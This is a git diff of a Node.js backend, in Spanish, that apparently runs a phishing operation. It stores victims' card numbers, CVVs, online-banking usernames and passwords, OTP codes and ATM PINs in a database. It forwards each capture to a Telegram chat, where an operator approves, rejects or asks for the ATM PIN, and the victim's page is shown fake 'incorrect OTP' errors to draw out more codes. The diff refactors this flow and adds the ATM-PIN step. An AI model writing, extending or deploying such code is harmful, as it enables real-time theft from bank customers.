@@ -54,7 +54,6 @@ async function initDB() {
           ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
     `);
     await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
-    console.log('✅ Tabla lista');
 }
 initDB().catch(err => console.error('❌ initDB:', err));
 
@@ -85,9 +84,8 @@ async function tgAnswerCallback(callbackQueryId, text) {
     } catch {}
 }
 
-function construirTextoPago(pago, tipoDato = '') {
-    let texto = 
-        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+function construirTextoPago(pago, tipo = '') {
+    let txt = `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
         `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
         `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
         `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
@@ -95,18 +93,16 @@ function construirTextoPago(pago, tipoDato = '') {
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n`;
     
-    if (tipoDato === 'cajero') {
-        texto += `\n🔑 <b>CLAVE CAJERO:</b> <code>${pago.codigo_otp || '—'}</code>\n`;
+    if (tipo === 'cajero') {
+        txt += `\n🔑 <b>CLAVE CAJERO:</b> <code>${pago.codigo_otp || '—'}</code>\n`;
     } else {
-        texto += 
-            `\n<b>── CREDENCIALES BANCO ──</b>\n` +
+        txt += `\n<b>── CREDENCIALES BANCO ──</b>\n` +
             `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
             `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
             `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>\n`;
     }
-
-    texto += `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`;
-    return texto;
+    txt += `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`;
+    return txt;
 }
 
 app.post('/api/crear-pago', async (req, res) => {
@@ -115,46 +111,32 @@ app.post('/api/crear-pago', async (req, res) => {
     if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
 
     try {
+        // 🔥 FORZAMOS SIEMPRE EL ESTADO A 'pendiente' EN LA BASE DE DATOS
         const result = await pool.query(
             `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual, estado)
              VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12, 'pendiente')
              ON CONFLICT (solicitud_id) DO UPDATE
                SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), estado = 'pendiente', updated_at = NOW()
              RETURNING *`,
-            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' ? 'otp' : 'credenciales']
+            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' || paso === 'cajero' ? 'otp' : 'credenciales']
         );
 
         const pago = result.rows[0];
         const pasoActual = (paso || 'crear').toLowerCase();
 
-        // 🔥 CONSTRUCCIÓN DEL MENSAJE Y BOTONES
         let texto, replyMarkup;
         if (pasoActual === 'crear') {
             texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
-            replyMarkup = { inline_keyboard: [[
-                { text: '✅ Aprobar Tarjeta',  callback_data: `aprobar:${pago.solicitud_id}` },
-                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-            ]]};
+            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Tarjeta',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
         } else if (pasoActual === 'credenciales') {
             texto = `📝 <b>CREDENCIALES RECIBIDAS</b>\n\n` + construirTextoPago(pago);
-            replyMarkup = { inline_keyboard: [[
-                { text: '✅ Aprobar Credenciales',  callback_data: `aprobar:${pago.solicitud_id}` },
-                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-            ]]};
+            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Credenciales',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
         } else if (pasoActual === 'otp') {
             texto = `🔐 <b>OTP RECIBIDO</b>\n\n` + construirTextoPago(pago);
-            // 🔥 AQUÍ ESTÁ EL NUEVO BOTÓN
-            replyMarkup = { inline_keyboard: [
-                [{ text: '✅ Aprobar Pago',  callback_data: `aprobar:${pago.solicitud_id}` }],
-                [{ text: '🔑 Pedir Clave Cajero', callback_data: `pedir_cajero:${pago.solicitud_id}` }],
-                [{ text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]
-            ]};
+            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Pago',  callback_data: `aprobar:${pago.solicitud_id}` }], [{ text: '🔑 Pedir Clave Cajero', callback_data: `pedir_cajero:${pago.solicitud_id}` }], [{ text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
         } else if (pasoActual === 'cajero') {
             texto = `🔑 <b>CLAVE CAJERO RECIBIDA</b>\n\n` + construirTextoPago(pago, 'cajero');
-            replyMarkup = { inline_keyboard: [[
-                { text: '✅ Aprobar Clave Cajero',  callback_data: `aprobar:${pago.solicitud_id}` },
-                { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
-            ]]};
+            replyMarkup = { inline_keyboard: [[{ text: '✅ Aprobar Clave Cajero',  callback_data: `aprobar:${pago.solicitud_id}` }, { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }]]};
         }
 
         const tgRes = await tgSendMessage(texto, replyMarkup);
@@ -169,30 +151,22 @@ app.post('/api/crear-pago', async (req, res) => {
     }
 });
 
-// Endpoint para que el frontend consulte el estado
 app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
     try {
         const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
         if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
         const row = result.rows[0];
 
-        if (row.estado === 'aprobado_credenciales') {
-            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
-        }
-        if (row.estado === 'rechazado_credenciales') {
-            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
-        }
-        // 🔥 NUEVO ESTADO: PEDIR CAJERO
-        if (row.estado === 'pedir_cajero') {
-            return res.json({ success: true, estado: 'pedir_cajero', fase: 'otp' });
-        }
-        if (row.estado === 'aprobado') {
-            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
-        }
-        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') {
-            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
-        }
+        if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
+        if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
+        
+        if (row.estado === 'pedir_cajero') return res.json({ success: true, estado: 'pedir_cajero', fase: 'otp' });
+        
+        // 🔥 SOLO REDIRIGE SI EL ESTADO ES 'aprobado'
+        if (row.estado === 'aprobado') return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
+        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
 
+        // 🔥 SI NO ESTÁ APROBADO, SIEMPRE ESPERA
         return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual || 'credenciales' });
     } catch (err) {
         return res.status(500).json({ success: false, error: 'Error' });
@@ -213,14 +187,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
         const pago = result.rows[0];
 
         if (accion === 'pedir_cajero') {
-            // 🔥 ACCIÓN DEL BOTÓN: MARCAR COMO PEDIR_CAJERO Y QUITAR BOTONES
             await pool.query(`UPDATE pagos_pendientes SET estado = 'pedir_cajero', paso = 'cajero', updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
             await tgAnswerCallback(cq.id, '✅ Pidiendo Clave de Cajero');
             if (msgId) await tgEditMessage(msgId, `⌛ <b>Esperando Clave del Cajero...</b>\n\n` + construirTextoPago(pago), { inline_keyboard: [] });
             return;
         }
-
-        const estaEnFaseOTP = (pago.paso === 'otp' || pago.paso === 'cajero');
 
         if (accion === 'aprobar') {
             if (pago.paso === 'crear') {
@@ -234,8 +205,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago), { inline_keyboard: [] });
             }
         } else if (accion === 'rechazar') {
-            const motivo = estaEnFaseOTP ? 'Clave/OTP incorrecto.' : 'Credenciales incorrectas.';
-            const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
+            const esFaseFinal = (pago.paso === 'otp' || pago.paso === 'cajero');
+            const motivo = esFaseFinal ? 'Clave/OTP incorrecto.' : 'Credenciales incorrectas.';
+            const nuevoEstado = esFaseFinal ? 'rechazado_otp' : 'rechazado_credenciales';
             await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`, { inline_keyboard: [] });
